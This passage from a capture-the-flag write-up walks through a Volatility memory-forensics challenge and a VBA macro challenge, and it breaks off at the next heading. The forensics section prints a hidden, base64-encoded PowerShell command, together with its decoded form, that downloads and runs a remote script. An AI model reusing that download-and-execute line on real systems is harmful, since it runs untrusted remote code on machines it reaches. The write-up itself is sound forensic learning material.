                          KDBG : 0x82930c68L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82931d00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2021-11-25 19:14:12 UTC+0000
     Image local date and time : 2021-11-25 11:14:12 -0800
```

Important things to note in the output: _Profile_ and _KDBG_. The next step was to find all the processes running on the system:

```bash
python2 vol.py -f ~/htb/challenges/for_honeypot/honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 pslist > ~/htb/challenges/for_honeypot/pslist.op
```
Other plugins that can be used: `psxlist`, `pstree` 

**pstree**: shows parent-child process and can output to several different formats

```bash
vol.py -f honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 pstree --output=dot --output-file infected.dot
```

One set of processes stands out: 

<figure>
<img src="/assets/img/htbctf/honeypotinteresting.png" alt="Interesting process">
</figure>

The malicious process PID is `2700` - one of the required components for flag
We can inspect the **Command line arguments used for powershell.exe** by using `cmdline`

```bash
vol.py -f honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 cmdline -p 2700 
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
powershell.exe pid:   2700
Command line : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==
```

Decoding the base64 text and we get the full command used

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e iex ((new-object net.webclient).downloadstring('https://windowsliveupdater.com/update.ps1'))
```

Thought the _malicious URL_ was `https://windowsliveupdater.com/update.ps1` but turned out to be wrong...

To get the IPs we can run `netscan` another plugin:

```bash
vol.py -f honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 netscan
```

And got stuck here and was not able to complete the challenge ＞﹏＜

---

## Giveaway

This was a generic Document forensics challenge involving **Macros**. We get a document file: `christmas_giveaway.docm`. Opening it up in LibreOffice tells that the document contains macros. 

<figure>
<img src="/assets/img/htbctf/giveawaymacro.png" alt="LibreOffice shows macros">
</figure>

To find out what the macros is doing: `Tools -> Macros -> Edit Macros` in LibreOffice:

<figure>
<img src="/assets/img/htbctf/giveawaymacrocode.png" alt="Macro code">
</figure>

One section of the code looks interesting: 

<figure>
<img src="/assets/img/htbctf/giveawayinteresting.png" alt="Macro code snippet">
</figure>

```vb
HPkXUcxLcAoMHOlj = "https://elvesfactory/" & Chr(Asc("H")) & Chr(84) & Chr(Asc("B")) & "" & Chr(123) & "" & Chr(84) & Chr(Asc("h")) & "1" & Chr(125 - 10) & Chr(Asc("_")) & "1s" & Chr(95) & "4"
cxPZSGdIQDAdRVpziKf = "_" & Replace("present", "e", "3") & Chr(85 + 10)
fqtSMHFlkYeyLfs = Replace("everybody", "e", "3")
fqtSMHFlkYeyLfs = Replace(fqtSMHFlkYeyLfs, "o", "0") & "_"
ehPsgfAcWaYrJm = Chr(Asc("w")) & "4" & Chr(110) & "t" & Chr(115) & "_" & Chr(Asc("f")) & "0" & Chr(121 - 7) & Chr(95)
FVpHoEqBKnhPO = Replace("christmas", "i", "1")
FVpHoEqBKnhPO = Replace(FVpHoEqBKnhPO, "a", "4") & Chr(119 + 6)
```

Converting the given code into python:

```python
>>> chr(ord('H')) + chr(84) + chr(ord('B')) + chr(123) + chr(84) + 'h' + '1' + chr(125-10) + '_' + '1s' + chr(95) + '4' + '_' + 'present'.replace('e', '3')
+ chr(85+10) + ('everybody'.replace('e', '3')).replace('o', '0') + '_' + 'w' + '4' + chr(110) + 't' + chr(115) + '_' + 'f' + '0' + chr(121-7) + chr(95) + ('christmas'.replace('i', '1')).replace('a', '4') + chr(119+6)
'HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}'
```

**FLAG: HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}**

---

## Ho Ho Ho

---